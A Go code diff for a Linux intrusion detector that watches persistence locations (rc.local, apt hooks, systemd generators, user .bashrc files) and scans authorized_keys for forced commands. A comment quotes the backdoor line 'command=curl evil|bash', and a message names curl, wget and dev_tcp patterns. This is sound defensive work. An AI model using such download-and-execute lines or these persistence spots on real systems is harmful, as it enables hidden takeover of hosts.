@@ -59,7 +59,21 @@ var defaults = []watch{
 	{path: "/lib64/security", typ: event.TypeSystemdServiceAdded, severity: event.SevCritical, title: "PAM module path changed", message: "new or modified PAM modules can create covert authentication backdoors"},
 	{path: "/usr/lib/security", typ: event.TypeSystemdServiceAdded, severity: event.SevCritical, title: "PAM module path changed", message: "new or modified PAM modules can create covert authentication backdoors"},
 	{path: "/etc/profile", typ: event.TypeSystemdServiceAdded, severity: event.SevMedium, title: "/etc/profile modified"},
+	{path: "/etc/profile.d", typ: event.TypeSystemdServiceAdded, severity: event.SevMedium, title: "/etc/profile.d/ changed", message: "scripts in /etc/profile.d run on every interactive shell"},
 	{path: "/etc/bash.bashrc", typ: event.TypeSystemdServiceAdded, severity: event.SevMedium, title: "/etc/bash.bashrc modified"},
+
+	// Additional persistence locations from current threat-intel.
+	{path: "/etc/rc.local", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "/etc/rc.local modified", message: "/etc/rc.local runs as root at boot — classic backdoor location"},
+	{path: "/etc/update-motd.d", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "/etc/update-motd.d/ changed", message: "MOTD scripts run on every interactive login as root"},
+	{path: "/etc/NetworkManager/dispatcher.d", typ: event.TypeSystemdServiceAdded, severity: event.SevMedium, title: "NetworkManager dispatcher script changed", message: "dispatcher scripts run on netif up/down as root"},
+	{path: "/etc/logrotate.d", typ: event.TypeSystemdServiceAdded, severity: event.SevMedium, title: "logrotate config changed", message: "logrotate scripts run as root daily — recent CVEs allow privesc through compromised configs"},
+	{path: "/etc/apt/apt.conf.d", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "apt hook config changed", message: "apt hooks run as root on every package op — trojaned hooks compromise every install"},
+	{path: "/etc/dnf/plugins", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "dnf plugin changed", message: "dnf plugins run as root on every package op"},
+	{path: "/etc/yum/pluginconf.d", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "yum plugin config changed"},
+	{path: "/etc/init.d", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "SysV init script changed"},
+	{path: "/etc/xinetd.d", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "xinetd service changed"},
+	{path: "/lib/systemd/system-generators", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "systemd generator changed", message: "systemd generators run early at boot as root"},
+	{path: "/usr/lib/systemd/system-generators", typ: event.TypeSystemdServiceAdded, severity: event.SevHigh, title: "systemd generator changed"},
 }
 
 type Detector struct {
@@ -158,6 +172,56 @@ func (d *Detector) Run(ctx context.Context, out chan<- *event.Event) error {
 				}
 			}
 
+			// Shell-init content scan: per-user .bashrc / .profile /
+			// .zshrc are favorite persistence files for Diicot, 8220,
+			// TeamTNT etc. Reuse the cron-content scanner — it already
+			// matches every pattern those families use.
+			if meta.typ == event.TypeSystemdServiceAdded &&
+				ev.Op&fsnotify.Remove == 0 &&
+				isShellInitFile(ev.Name) {
+				if r := scanCronContent(ev.Name); r.Reason != "" {
+					emit.Severity = event.SevCritical
+					emit.Title = "Shell init file contains attacker-style payload"
+					emit.WithMessage("a per-user shell init file contains a one-liner pattern strongly associated with miner / botnet / RAT persistence")
+					emit.WithField("reason", r.Reason)
+					if r.Snippet != "" {
+						emit.WithField("snippet", r.Snippet)
+					}
+				}
+			}
+
+			// authorized_keys content scan: when an SSH key file
+			// changes, parse the new lines for forced commands and
+			// wildcard-from clauses. The classic "command=curl evil|bash"
+			// backdoor is the highest-value catch.
+			if meta.typ == event.TypeSSHKeyAdded &&
+				ev.Op&fsnotify.Remove == 0 &&
+				strings.HasSuffix(ev.Name, "/authorized_keys") {
+				if r := scanAuthorizedKeys(ev.Name); r.Reason != "" {
+					if r.Reason == "forced_command_payload" {
+						emit.Severity = event.SevCritical
+						emit.Title = "SSH key with attacker-style forced command"
+						emit.WithMessage("a key in authorized_keys uses command=\"...\" with curl/wget/base64/dev_tcp/etc. — backdoor pattern")
+					} else if r.Reason == "forced_command" {
+						emit.Severity = event.SevHigh
+						emit.WithMessage("a key in authorized_keys has a forced command — review whether this is intentional")
+					} else if r.Reason == "from_wildcard" {
+						emit.Severity = event.SevHigh
+						emit.WithMessage("a key in authorized_keys uses from=\"*\" or from=\"0.0.0.0/0\" — overly permissive")
+					}
+					emit.WithField("reason", r.Reason)
+					if r.Fingerprint != "" {
+						emit.WithField("fingerprint", r.Fingerprint)
+					}
+					if r.Comment != "" {
+						emit.WithField("key_comment", r.Comment)
+					}
+					if r.Snippet != "" {
+						emit.WithField("options", r.Snippet)
+					}
+				}
+			}
+
 			out <- emit
 		case err := <-w.Errors:
 			if err != nil && ctx.Err() == nil {
@@ -198,7 +262,37 @@ func addUserKeys(w *fsnotify.Watcher, index map[string]watch, homeRoot string) {
 		}
 		_ = w.Add(keyPath)
 		_ = w.Add(sshDir)
+
+		// Per-user shell-init persistence files. Diicot, 8220, and
+		// TeamTNT all routinely append loader one-liners to .bashrc /
+		// .profile / .zshrc. Coverage here closes a real gap.
+		userHome := filepath.Join(homeRoot, entry.Name())
+		for _, rcName := range []string{".bashrc", ".bash_profile", ".profile", ".zshrc", ".zprofile", ".bash_aliases"} {
+			rcPath := filepath.Join(userHome, rcName)
+			if _, ok := index[rcPath]; ok {
+				continue
+			}
+			index[rcPath] = watch{
+				path:     rcPath,
+				typ:      event.TypeSystemdServiceAdded, // shares persistence event type
+				severity: event.SevHigh,
+				title:    "User shell init file modified",
+				message:  "per-user shell init files (.bashrc/.profile/.zshrc) are a common attacker persistence path",
+			}
+			_ = w.Add(rcPath)
+		}
 	}
+}
+
+// isShellInitFile reports whether a path looks like a per-user shell
+// init file we want to content-scan.
+func isShellInitFile(p string) bool {
+	for _, n := range []string{".bashrc", ".bash_profile", ".profile", ".zshrc", ".zprofile", ".bash_aliases"} {
+		if strings.HasSuffix(p, "/"+n) {
+			return true
+		}
+	}
+	return false
 }
 
 func isHomeChild(p, homeRoot string) bool {
